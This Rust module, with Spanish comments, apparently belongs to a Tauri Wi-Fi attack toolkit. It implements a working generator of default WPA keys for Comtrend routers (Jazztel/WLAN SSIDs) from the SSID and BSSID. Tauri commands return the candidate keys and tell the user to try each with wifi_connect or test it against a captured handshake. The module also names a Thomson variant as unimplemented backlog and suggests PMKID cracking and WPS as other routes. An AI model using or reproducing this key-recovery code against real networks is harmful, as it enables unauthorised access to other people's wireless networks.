// Keygen de claves por defecto — vía de CONEXIÓN sin RF (lab).
// Algoritmos públicos (Router Keygen, GPL):
// - Comtrend (Jazztel_XXXX / WLAN_XXXX): MD5("bcgbghgg"+magia+XX+ssid4+mac)[0..20].
//   OUI 001A2B → 512 candidatos; resto → 1 candidato.
// - Thomson (ThomsonXXXXXX, Orange-XXXXXX, ...): requiere diccionario OUI +
//   fuerza bruta SHA1 (años 04-12 × semanas × OUIs) → BACKLOG documentado,
//   no implementado (ver README, matriz de conexión).
use tauri::{command, AppHandle};
use crate::commands::CmdResponse;

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum KeygenAlg {
    Comtrend,
    ThomsonBacklog,
    None,
}

/// Detección por patrón de SSID. Pura, testeable.
pub fn detect_alg(ssid: &str) -> KeygenAlg {
    let s = ssid.trim();
    if let Some(suf) = s
        .strip_prefix("Jazztel_")
        .or_else(|| s.strip_prefix("JAZZTEL_"))
        .or_else(|| s.strip_prefix("WLAN_"))
    {
        if suf.len() == 4 && suf.chars().all(|c| c.is_ascii_hexdigit()) {
            return KeygenAlg::Comtrend;
        }
    }
    // Thomson y familia: 6 hex al final con prefijo conocido.
    const THOMSON_PREFIX: &[&str] = &[
        "Thomson", "SpeedTouch", "Orange-", "Orange_", "Infinitum", "BBox-", "BBox_",
        "DMax", "BigPond", "O2Wireless", "Otenet", "Cyta", "TN_private", "Blink",
    ];
    if s.len() > 6 {
        let (head, tail) = s.split_at(s.len() - 6);
        if tail.chars().all(|c| c.is_ascii_hexdigit())
            && THOMSON_PREFIX.iter().any(|p| head.eq_ignore_ascii_case(p))
        {
            return KeygenAlg::ThomsonBacklog;
        }
    }
    KeygenAlg::None
}

fn clean_mac(bssid: &str) -> Option<String> {
    let m: String = bssid.chars().filter(|c| c.is_ascii_hexdigit()).collect();
    if m.len() == 12 {
        Some(m.to_uppercase())
    } else {
        None
    }
}

fn md5_hex(data: &[u8]) -> String {
    format!("{:x}", md5::compute(data))
}

/// Comtrend: MD5(magic + [magia2 + XX] + ssid4 + mac), 20 primeros hex.
pub fn comtrend_keys(ssid: &str, bssid: &str) -> Result<Vec<String>, String> {
    let mac = clean_mac(bssid).ok_or_else(|| "BSSID inválido (se necesitan 12 hex)".to_string())?;
    let ssid4 = ssid.trim().chars().rev().take(4).collect::<String>().chars().rev().collect::<String>();
    if ssid4.len() != 4 {
        return Err("SSID demasiado corto para Comtrend (sufijo XXXX)".into());
    }
    const MAGIC: &str = "bcgbghgg";
    let mut out = vec![];
    if mac.starts_with("001A2B") {
        for i in 0..512u16 {
            let (magia2, xx) = if i < 256 {
                ("64680C", format!("{:02X}", i))
            } else {
                ("3872C0", format!("{:02X}", i - 256))
            };
            let data = format!("{}{}{}{}{}", MAGIC, magia2, xx, ssid4, mac);
            out.push(md5_hex(data.as_bytes())[..20].to_string());
        }
    } else {
        let macmod = format!("{}{}", &mac[..8], ssid4).to_uppercase();
        let data = format!("{}{}{}", MAGIC, macmod, mac);
        out.push(md5_hex(data.as_bytes())[..20].to_string());
    }
    Ok(out)
}

/// Comando: dice qué algoritmo aplica a un SSID (sin calcular nada).
#[command]
pub async fn keygen_detect(_app: AppHandle, ssid: String) -> CmdResponse {
    let (msg, ok) = match detect_alg(&ssid) {
        KeygenAlg::Comtrend => (
            format!("{} → Comtrend (Jazztel_/WLAN_). Genera candidatos con keygen_run (necesita BSSID).", ssid.trim()),
            true,
        ),
        KeygenAlg::ThomsonBacklog => (
            format!("{} → Thomson/familia: algoritmo documentado pero NO implementado (requiere diccionario OUI + SHA1). Backlog.", ssid.trim()),
            false,
        ),
        KeygenAlg::None => (
            format!("{} → sin keygen conocido. Vías: PMKID/handshake + crack, portal, WPS.", ssid.trim()),
            false,
        ),
    };
    CmdResponse { success: ok, output: msg, stderr: String::new(), exit_code: Some(ok as i32) }
}

/// Comando: genera candidatos Comtrend para SSID+BSSID.
#[command]
pub async fn keygen_run(_app: AppHandle, ssid: String, bssid: String) -> CmdResponse {
    match detect_alg(&ssid) {
        KeygenAlg::Comtrend => {}
        KeygenAlg::ThomsonBacklog => {
            return CmdResponse {
                success: false, output: String::new(),
                stderr: "Thomson: no implementado (diccionario OUI + SHA1). Ver README.".into(),
                exit_code: None,
            }
        }
        KeygenAlg::None => {
            return CmdResponse {
                success: false, output: String::new(),
                stderr: "Sin keygen conocido para este SSID.".into(), exit_code: None,
            }
        }
    }
    match comtrend_keys(&ssid, &bssid) {
        Ok(keys) => CmdResponse {
            success: true,
            output: format!(
                "Comtrend · {} candidatos para {} ({}):\n{}\n\nPrueba cada uno con wifi_connect o verifícalos contra el handshake.",
                keys.len(), ssid.trim(), bssid.to_uppercase(),
                keys.join("\n")
            ),
            stderr: String::new(),
            exit_code: Some(0),
        },
        Err(e) => CmdResponse { success: false, output: String::new(), stderr: e, exit_code: None },
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn detects_patterns() {
        assert_eq!(detect_alg("Jazztel_A1B2"), KeygenAlg::Comtrend);
        assert_eq!(detect_alg("WLAN_00ff"), KeygenAlg::Comtrend);
        assert_eq!(detect_alg("ThomsonA1B2C3"), KeygenAlg::ThomsonBacklog);
        assert_eq!(detect_alg("Orange-123ABC"), KeygenAlg::ThomsonBacklog);
        assert_eq!(detect_alg("TP-Link_29D6"), KeygenAlg::None);
        assert_eq!(detect_alg("JazztelTOOLONG"), KeygenAlg::None);
    }

    #[test]
    fn comtrend_shapes() {
        // Rama 001A2B → 512 candidatos de 20 hex.
        let many = comtrend_keys("WLAN_AB12", "00:1A:2B:11:22:33").unwrap();
        assert_eq!(many.len(), 512);
        assert!(many.iter().all(|k| k.len() == 20 && k.chars().all(|c| c.is_ascii_hexdigit())));
        // Rama genérica → 1 candidato, determinista.
        let one1 = comtrend_keys("Jazztel_A1B2", "48:22:54:88:29:D6").unwrap();
        let one2 = comtrend_keys("Jazztel_A1B2", "48:22:54:88:29:d6").unwrap();
        assert_eq!(one1.len(), 1);
        assert_eq!(one1, one2);
        assert!(comtrend_keys("WLAN_AB12", "corto").is_err());
    }

    #[test]
    fn comtrend_vectors_crosschecked_dotnet() {
        // Vectores validados con implementación independiente (PowerShell/.NET MD5).
        assert_eq!(
            comtrend_keys("Jazztel_A1B2", "48:22:54:88:29:D6").unwrap(),
            vec!["6cbf0d9cf41bab8d8a37".to_string()]
        );
        let many = comtrend_keys("WLAN_AB12", "00:1A:2B:11:22:33").unwrap();
        assert_eq!(&many[0], "42ab47577d0c2d329870");
    }
}
